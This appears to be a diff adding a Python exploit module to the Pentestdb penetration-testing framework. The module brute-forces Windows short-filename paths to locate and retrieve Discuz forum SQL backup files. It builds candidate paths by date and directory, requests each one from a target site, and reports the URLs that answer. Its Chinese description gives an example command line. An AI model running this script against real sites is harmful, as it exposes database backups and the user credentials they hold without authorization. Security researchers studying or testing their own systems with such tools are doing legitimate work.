@@ -1,0 +1,84 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+import datetime
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+from script.libs.commons import Log
+
+
+
+class DiscuzFD(Exploit):
+    expName = u"Discuz 备份文件短文件名爆破"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2012-09477','http://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/']
+    description = u'''
+        漏洞利用条件：windows系统且没有关闭短文件名功能
+        自定义参数：
+            type：discuz种类，只有discuz和discuzx两种
+            date：指定开始日期，exploit将从这个日期开始进行爆破格式，YY-MM-DD，year为后两位
+            days: 爆破多少天的备份
+            dirs：指定back-xxx目录爆破数量，默认只爆破BACKUP~1
+        例如：
+            pen.py exploit -e exploit\cms_discuz_backupfile_bruteforce.py -u http://127.0.0.1/discuz/x2.5/ --elseargs type=discuzx#date=16-02-28#days=5#dirs=2
+    '''
+
+    def genPath(self,dctype,date,days,dirs):
+        if dctype == 'discuz':
+            pathPrefix = "/forumdata/"
+        else:
+            pathPrefix = "/data/"
+
+        startDate = datetime.datetime.strptime(date,"%y-%m-%d")
+        for d in range(1,dirs+1):
+            for t in range(days):
+                for i in range(1,2):
+                    strtime = startDate + datetime.timedelta(t)
+                    strtime = strtime.strftime("%y%m%d")
+                    yield pathPrefix + "BACKUP~" + str(d) + "/" + strtime + "~" + str(i) + ".sql"
+
+
+    def _verify(self):
+        log = Log("exploit-discuz_brutefile")
+        result = Result(self)
+
+        dctype = self.args.get("type","discuz").lower()
+        if dctype not in ['discuz','discuzx']:
+            dctype = "discuz"
+        date = self.args.get("date","15-01-01")
+        days = self.args.get("days","10")
+        days = int(days)
+        dirs = self.args.get("dirs","1")
+        dirs = int(dirs)
+
+        url = self.baseURL if ".php" in self.url else self.url
+        url = url.rstrip("/")
+        alives = []
+        for path in self.genPath(dctype,date,days,dirs):
+            try:
+                log.debug("request url {0}".format(url+path))
+                response = self.http.get(url+path)
+            except self.http.ConnectionError:
+                pass
+
+            if response.status_code == 200:
+                log.debug("got alives {0}".format(url+path))
+                alives.append(url+path)
+
+        if alives:
+            result['vulinfo'] = str(alives)
+
+        return result
+
+    def _attack(self):
+        return self.verify()
